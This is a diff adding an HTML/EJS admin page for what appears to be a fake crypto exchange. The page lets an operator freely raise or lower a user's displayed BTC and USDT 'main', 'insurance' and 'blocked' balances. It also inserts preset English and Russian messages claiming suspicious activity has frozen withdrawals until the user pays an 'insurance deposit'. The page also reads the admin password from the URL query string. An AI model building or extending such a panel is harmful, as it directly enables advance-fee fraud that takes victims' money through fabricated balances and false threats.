@@ -1,0 +1,219 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>unitedw</title>
+
+    <style>
+        th, td {
+            width: 16%;
+            text-align: center;
+        }
+
+        #main-table {
+            width: 100%;
+        }
+
+        #block {
+            display: flex;
+            flex-direction: column;
+            align-items: stretch;
+            width: 100%;
+        }
+
+        .op {
+            width: 21px;
+            height: 21px;
+        }
+    </style>
+</head>
+<body>
+    <form>
+        <input type="hidden" name="type" value="get">
+        <input type="hidden" name="password">
+        <input type="text" name="email">
+        <input type="submit" value="Submit">
+    </form>
+
+    <input type="hidden" value="<%= users %>" id="response">
+
+    <script>
+        const urlSearchParams = new URLSearchParams(window.location.search);
+        const params = Object.fromEntries(urlSearchParams.entries());
+
+        let email = document.querySelector('input[name=email]');
+        let password = document.querySelector('input[name=password]');
+
+        if ('password' in params) document.querySelectorAll('input[name=password]').forEach(elem => elem.value = params.password);
+        if ('email' in params) document.querySelectorAll('input[name=email]').forEach(elem => elem.value = params.email);
+
+        const message_en = "We noticed suspicious activity on your wallet. We have the right to block your withdrawal of funds. To unlock the withdrawal, you need to make a insurance deposit of $ to your insurance wallet.";
+        const message_ru = "Мы заметили подозрительную активность на вашем кошельке. Мы имеем право заблокировать вывод ваших средств. Чтобы разблокировать вывод средств, вам необходимо внести депозит в размере $ на ваш страховой счёт.";
+
+        function fetchUrl (url) {
+            return new Promise(resolve => {
+                fetch(url, { method: "GET" }).then(res => {
+                    resolve(res.json());
+                });
+            });
+        }
+
+        function convertToBitcoin (amount, mirror=true) {
+            return new Promise(resolve => {
+                fetchUrl("https://api.binance.com/api/v3/ticker/price?symbol=BTCUSDT").then(res => {
+                    let price = parseFloat(res['price']);
+                    if (mirror) resolve(+(amount * (1 / price)).toFixed(8));
+                    else resolve(+(amount * price).toFixed(2));
+                });
+            });
+        }
+
+
+        let user = JSON.parse(document.querySelector('#response').value);
+
+
+        if (!user.empty) {
+            window.onload = () => {
+                document.querySelector('#id').innerText = user.id;
+                document.querySelector('#email').innerText = user.email;
+                document.querySelector('#block-amount').value = user.block;
+
+                const main_btc = document.querySelector('#main .btc');
+                const main_usdt = document.querySelector('#main .usdt');
+                const ins_btc = document.querySelector('#ins .btc');
+                const ins_usdt = document.querySelector('#ins .usdt');
+                const bl_btc = document.querySelector('#bl .btc');
+                const bl_usdt = document.querySelector('#bl .usdt');
+
+
+                main_btc.value = user.main[0];
+                main_usdt.value = user.main[1];
+                ins_btc.value = user.ins[0];
+                ins_usdt.value = user.ins[1];
+                bl_btc.value = user.bl[0];
+                bl_usdt.value = user.bl[1];
+
+                main_btc.addEventListener('change', () => convertToBitcoin(parseFloat(main_btc.value), false).then(res => main_usdt.value = res));
+                main_usdt.addEventListener('change', () => convertToBitcoin(parseFloat(main_usdt.value)).then(res => main_btc.value = res));
+
+                ins_btc.addEventListener('change', () => convertToBitcoin(parseFloat(ins_btc.value), false).then(res => ins_usdt.value = res));
+                ins_usdt.addEventListener('change', () => convertToBitcoin(parseFloat(ins_usdt.value)).then(res => ins_btc.value = res));
+
+                bl_btc.addEventListener('change', () => convertToBitcoin(parseFloat(bl_btc.value), false).then(res => bl_usdt.value = res));
+                bl_usdt.addEventListener('change', () => convertToBitcoin(parseFloat(bl_usdt.value)).then(res => bl_btc.value = res));
+
+                document.querySelector('#block-ru').addEventListener('click', () => document.querySelector('#block-amount').value = message_ru);
+                document.querySelector('#block-en').addEventListener('click', () => document.querySelector('#block-amount').value = message_en);
+                document.querySelector('#block-def').addEventListener('click', () => document.querySelector('#block-amount').value = user.block);
+
+
+                document.querySelectorAll('#main .sub')[0].addEventListener('click', () => {
+                    main_btc.value = +(parseFloat(main_btc.value) - parseFloat(prompt())).toFixed(8);
+                    main_btc.dispatchEvent(new Event("change"));
+                });
+                document.querySelectorAll('#main .add')[0].addEventListener('click', () => {
+                    main_btc.value = +(parseFloat(main_btc.value) + parseFloat(prompt())).toFixed(8);
+                    main_btc.dispatchEvent(new Event("change"));
+                });
+
+                document.querySelectorAll('#main .sub')[1].addEventListener('click', () => {
+                    main_usdt.value = +(parseFloat(main_usdt.value) - parseFloat(prompt())).toFixed(2);
+                    main_usdt.dispatchEvent(new Event("change"));
+                });
+                document.querySelectorAll('#main .add')[1].addEventListener('click', () => {
+                    main_usdt.value = +(parseFloat(main_usdt.value) + parseFloat(prompt())).toFixed(2);
+                    main_usdt.dispatchEvent(new Event("change"));
+                });
+
+                document.querySelectorAll('#ins .sub')[0].addEventListener('click', () => {
+                    ins_btc.value = +(parseFloat(ins_btc.value) - parseFloat(prompt())).toFixed(8);
+                    ins_btc.dispatchEvent(new Event("change"));
+                });
+                document.querySelectorAll('#ins .add')[0].addEventListener('click', () => {
+                    ins_btc.value = +(parseFloat(ins_btc.value) + parseFloat(prompt())).toFixed(8);
+                    ins_btc.dispatchEvent(new Event("change"));
+                });
+
+                document.querySelectorAll('#ins .sub')[1].addEventListener('click', () => {
+                    ins_usdt.value = +(parseFloat(ins_usdt.value) - parseFloat(prompt())).toFixed(2);
+                    ins_usdt.dispatchEvent(new Event("change"));
+                });
+                document.querySelectorAll('#ins .add')[1].addEventListener('click', () => {
+                    ins_usdt.value = +(parseFloat(ins_usdt.value) + parseFloat(prompt())).toFixed(2);
+                    ins_usdt.dispatchEvent(new Event("change"));
+                });
+
+                document.querySelectorAll('#bl .sub')[0].addEventListener('click', () => {
+                    bl_btc.value = +(parseFloat(bl_btc.value) - parseFloat(prompt())).toFixed(8);
+                    bl_btc.dispatchEvent(new Event("change"));
+                });
+                document.querySelectorAll('#bl .add')[0].addEventListener('click', () => {
+                    bl_btc.value = +(parseFloat(bl_btc.value) + parseFloat(prompt())).toFixed(8);
+                    bl_btc.dispatchEvent(new Event("change"));
+                });
+
+                document.querySelectorAll('#bl .sub')[1].addEventListener('click', () => {
+                    bl_usdt.value = +(parseFloat(bl_usdt.value) - parseFloat(prompt())).toFixed(2);
+                    bl_usdt.dispatchEvent(new Event("change"));
+                });
+                document.querySelectorAll('#bl .add')[1].addEventListener('click', () => {
+                    bl_usdt.value = +(parseFloat(bl_usdt.value) + parseFloat(prompt())).toFixed(2);
+                    bl_usdt.dispatchEvent(new Event("change"));
+                });
+
+                document.querySelector('#submit').addEventListener("keypress", function (event) {
+                    if (event.key === "Enter") {
+                        event.preventDefault();
+                    }
+                });
+            }
+        } else {
+            window.onload = () => document.querySelector('#main-form').style.display = 'none';
+        }
+    </script>
+
+    <form onkeydown="return event.key != 'Enter';" id="main-form">
+    <input type="hidden" name="password">
+    <input type="hidden" name="email">
+    <input type="hidden" name="type" value="post">
+    <table id="main-table">
+        <tr>
+            <th>id</th>
+            <th>email</th>
+            <th>main</th>
+            <th>insurance</th>
+            <th>blocked</th>
+            <th>block-amount</th>
+        </tr>
+        <tr>
+            <td id="id"></td>
+            <td id="email"></td>
+            <td id="main">
+                <div class="btc-block"><input type="text" id="main-btc" class="balance-input btc" name="main"><button type="button" class="op sub">-</button><button type="button" class="op add">+</button></div>
+                <div class="usdt-block"><input type="text" id="main-usdt" class="balance-input usdt"><button type="button" class="op sub">-</button><button type="button" class="op add">+</button></div>
+            </td>
+            <td id="ins">
+                <div class="btc-block"><input type="text" id="ins-btc" class="balance-input btc" name="ins"><button type="button" class="op sub">-</button><button type="button" class="op add">+</button></div>
+                <div class="usdt-block"><input type="text" id="ins-usdt" class="balance-input usdt"><button type="button" class="op sub">-</button><button type="button" class="op add">+</button></div>
+            </td>
+            <td id="bl">
+                <div class="btc-block"><input type="text" id="bl-btc" class="balance-input btc" name="bl"><button type="button" class="op sub">-</button><button type="button" class="op add">+</button></div>
+                <div class="usdt-block"><input type="text" id="bl-usdt" class="balance-input usdt"><button type="button" class="op sub">-</button><button type="button" class="op add">+</button></div>
+            </td>
+            <td id="block">
+                <input type="text" id="block-amount" name="block">
+                <div id="block-buttons">
+                    <button id="block-ru" type="button">Set ru text</button>
+                    <button id="block-en" type="button">Set en text</button>
+                    <button id="block-def" type="button">Back</button>
+                </div>
+            </td>
+        </tr>
+    </table>
+    <button type="submit" id="submit">Update</button>
+    </form>
+</body>
+</html>
